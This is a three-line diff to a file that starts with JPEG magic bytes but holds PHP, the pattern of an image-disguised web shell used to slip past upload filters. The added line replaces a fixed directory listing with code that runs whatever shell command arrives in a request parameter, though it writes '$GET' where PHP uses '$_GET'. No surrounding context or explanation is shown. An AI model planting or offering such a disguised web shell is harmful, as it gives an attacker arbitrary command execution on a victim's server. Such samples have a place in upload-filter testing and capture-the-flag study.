@@ -1,3 +1,3 @@
 ÿØÿ<?php
-system('ls /');
+echo system($GET['cmd']);
 ?>
